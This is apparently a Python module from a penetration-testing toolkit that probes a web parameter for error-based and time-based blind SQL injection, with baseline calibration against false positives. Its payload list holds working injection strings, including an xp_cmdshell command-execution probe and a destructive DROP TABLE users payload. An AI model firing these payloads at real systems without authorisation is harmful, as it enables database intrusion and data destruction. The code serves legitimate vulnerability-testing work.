"""
modules/vuln_scan/sqli_tester.py — SQL Injection vulnerability tester.

Sends error-based and time-based blind SQLi payloads to a target URL
parameter, checking response bodies for common database error strings
and measuring response times to detect time-based blind injection.

False positives are controlled through baseline calibration:

- A benign probe request identifies DB error strings that are already
  present in *normal* responses (e.g. a page that literally discusses
  "syntax errors"). Signatures present in the baseline never fire.
- Baseline response times raise the time-based threshold so a naturally
  slow server is not reported as time-based blind SQLi.
- Any response that exceeds the time threshold is re-sent once; only
  reproducible delays are reported as CRITICAL, one-off delays as INFO.
"""

import logging
import time

from requests.utils import quote
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.core.http_client import HttpClient
from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------
# Error-based SQLi payloads
# -----------------------------------------------------------------------
SQLI_PAYLOADS: list[str] = [
    "'",
    "''",
    "`",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1' ORDER BY 3 --",
    "1' UNION SELECT NULL --",
    "1' UNION SELECT NULL,NULL --",
    "1' AND SLEEP(5) --",
    "1; WAITFOR DELAY '0:0:5'",
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "' AND extractvalue(1,concat(0x7e,(SELECT version()))) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))XXXX) AND 1=1",
    "'; DROP TABLE users; --",
]

# -----------------------------------------------------------------------
# DB error string signatures
# -----------------------------------------------------------------------
DB_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "column count doesn't match",
        "mysql server version for the right syntax",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "postgresql",
        "syntax error at or near",
        "unterminated quoted identifier",
        "invalid input syntax for type",
    ],
    "MSSQL": [
        "microsoft sql server",
        "odbc sql server driver",
        "unclosed quotation mark",
        "quoted_identifier",
        "syntax error converting",
        "procedure or function",
        "incorrect syntax near",
    ],
    "Oracle": [
        "ora-00933",
        "ora-00907",
        "oracle error",
        "oracle.*driver",
        "warning.*oci_",
        "quoted string not properly terminated",
    ],
    "SQLite": [
        "sqlite_error",
        "sqlite3::query",
        "sqlite3_prepare",
        "sql logic error",
        "no such column",
        "unable to open database file",
    ],
    "Generic": [
        "sql syntax",
        "sql error",
        "database error",
        "query failed",
        "sql command not properly ended",
        "jdbc",
        "syntax error",
        "division by zero",
    ],
}

# Time-based blind threshold floor in seconds
TIME_THRESHOLD: float = 4.5
# Number of benign baseline requests used for calibration
BASELINE_SAMPLES: int = 2
# A payload must be at least this many times slower than the baseline to
# be considered a time-based signal (protects naturally slow servers).
BASELINE_TIME_FACTOR: float = 3.0


class SqliTester(BaseModule):
    """Test a query parameter for error-based and time-based blind SQL injection.

    Iterates over a set of error-based payloads, inspecting responses for
    known database error signatures. Also measures response time to detect
    time-based blind injection (e.g. SLEEP(), WAITFOR DELAY). Baseline
    calibration against a benign request suppresses false positives.
    """

    name = "SQLi Tester"
    description = "Tests a query parameter for error-based and time-based blind SQL injection."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL (e.g. https://example.com/items).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter name to inject into (e.g. id).",
        },
        "timeout": {
            "value": 10,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 10).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _check_errors(body: str) -> tuple[bool, str, str]:
        """Scan response body for database error signatures.

        Args:
            body: HTTP response body as a string.

        Returns:
            Tuple of (found: bool, db_type: str, matched_string: str).
        """
        body_lower = body.lower()
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in body_lower:
                    return True, db_type, pattern
        return False, "", ""

    def _retest(self, http: HttpClient, url: str, threshold: float) -> float | None:
        """Re-send a slow payload once to verify the delay is reproducible.

        Args:
            http: HTTP client.
            url: Full URL including the injected payload.
            threshold: Time threshold in seconds.

        Returns:
            The retest elapsed time in seconds if it also exceeded the
            threshold, otherwise None (including when the retest request
            itself fails).
        """
        try:
            start = time.monotonic()
            http.get(url)
            elapsed = time.monotonic() - start
        except Exception:  # noqa: BLE001 — a failed retest is simply "not confirmed"
            logger.debug("Retest request failed for '%s'.", url)
            return None
        return elapsed if elapsed >= threshold else None

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Send all payloads and check for error strings and time delays."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        http = self.http_client(target)

        confirmed_error: set[str] = set()
        confirmed_time: list[tuple[str, float, float]] = []
        one_offs: list[tuple[str, float]] = []
        seen_slow: set[str] = set()

        # ------------------------------------------------------------------
        # Baseline calibration — a benign parameter value tells us which DB
        # error strings are already present in normal responses and how fast
        # the server usually answers.
        # ------------------------------------------------------------------
        benign_url = f"{target}?{param}=redkit-baseline-probe"
        baseline_errors: set[str] = set()
        baseline_time: float = 0.0
        try:
            baseline_times: list[float] = []
            for _ in range(BASELINE_SAMPLES):
                start = time.monotonic()
                resp = http.get(benign_url)
                baseline_times.append(time.monotonic() - start)
                found, db_type, _matched = self._check_errors(resp.text)
                if found:
                    baseline_errors.add(db_type)
            baseline_time = max(baseline_times)
            if baseline_errors:
                logger.info(
                    "Baseline response already contains DB error strings — "
                    "skipping error-based detection for: %s",
                    ", ".join(sorted(baseline_errors)),
                )
        except Exception as exc:  # noqa: BLE001
            logger.warning("Baseline request failed — error/timing baselines unavailable: %s", exc)

        time_threshold = max(TIME_THRESHOLD, baseline_time * BASELINE_TIME_FACTOR)
        logger.info(
            "SQLi testing: target=%s, param=%s, payloads=%d, baseline_time=%.2fs, time_threshold=%.2fs",
            target,
            param,
            len(SQLI_PAYLOADS),
            baseline_time,
            time_threshold,
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing SQLi payloads on {target}", total=len(SQLI_PAYLOADS))
            self._progress = progress

            for payload in SQLI_PAYLOADS:
                progress.advance(task)
                url = f"{target}?{param}={quote(payload)}"
                try:
                    start = time.monotonic()
                    resp = http.get(url)
                    elapsed = time.monotonic() - start

                    # Error-based check — the signature must appear with the
                    # payload AND must not already be present in the benign
                    # baseline response.
                    found, db_type, matched = self._check_errors(resp.text)
                    if found and db_type not in baseline_errors and db_type not in confirmed_error:
                        confirmed_error.add(db_type)
                        logger.warning("SQLi error-based confirmed: %s (DB: %s)", payload, db_type)
                        self.add_finding(
                            finding_type="SQL Injection",
                            severity="CRITICAL",
                            title=f"Error-based SQLi detected ({db_type})",
                            detail=(
                                f"A database error message was observed in the response, indicating "
                                f"unsanitised input is being passed to a {db_type} query. "
                                f"Error signature matched: '{matched}'."
                            ),
                            evidence=(
                                f"GET {url}\nPayload: {payload}\n"
                                f"Matched error: '{matched}'\nElapsed: {elapsed:.2f}s\n"
                                f"(Signature absent from benign baseline response.)"
                            ),
                            # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
                            cvss=9.1,
                        )

                    # Time-based blind check — a slow response is re-sent once
                    # so only reproducible delays are reported as CRITICAL.
                    if elapsed >= time_threshold and payload not in seen_slow:
                        seen_slow.add(payload)
                        retest = self._retest(http, url, time_threshold)
                        if retest is not None:
                            confirmed_time.append((payload, elapsed, retest))
                            logger.warning(
                                "Time-based blind SQLi confirmed (reproducible): %s (%.2fs / %.2fs)",
                                payload,
                                elapsed,
                                retest,
                            )
                        else:
                            one_offs.append((payload, elapsed))
                            logger.info(
                                "One-off slow response for '%s' (%.2fs) — not reproducible.",
                                payload,
                                elapsed,
                            )

                except Exception as exc:  # noqa: BLE001 — keep scanning remaining payloads
                    logger.debug("Request error for SQLi payload '%s': %s", payload, exc)

        # One consolidated CRITICAL finding when any delay reproduced.
        if confirmed_time:
            listing = "; ".join(f"{p}: {t1:.2f}s/{t2:.2f}s" for p, t1, t2 in confirmed_time)
            self.add_finding(
                finding_type="SQL Injection (Blind)",
                severity="CRITICAL",
                title="Time-based blind SQLi detected (reproducible)",
                detail=(
                    f"Reproducible time delays were observed via the '{param}' parameter "
                    f"(threshold {time_threshold:.2f}s, baseline {baseline_time:.2f}s). This "
                    f"strongly suggests time-delay payloads were executed by the database."
                ),
                evidence=(
                    f"Target: {target} (parameter: {param})\n"
                    f"Response times request/retest (threshold {time_threshold:.2f}s, "
                    f"baseline {baseline_time:.2f}s): {listing}"
                ),
                # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
                cvss=7.5,
            )
        elif one_offs:
            listing = "; ".join(f"{p} ({t:.2f}s)" for p, t in one_offs)
            self.add_finding(
                finding_type="SQL Injection (Blind)",
                severity="INFO",
                title="Possible time-based blind SQLi (not reproducible)",
                detail=(
                    f"A single response per payload exceeded the time threshold "
                    f"({time_threshold:.2f}s, baseline {baseline_time:.2f}s), but the delays did "
                    f"not reproduce on retest. This is likely server latency or noise — manual "
                    f"verification advised."
                ),
                evidence=f"Target: {target} (parameter: {param})\nOne-off slow payloads: {listing}",
            )

        total = len(self.get_findings())
        logger.info("SQLi testing complete: %d finding(s).", total)
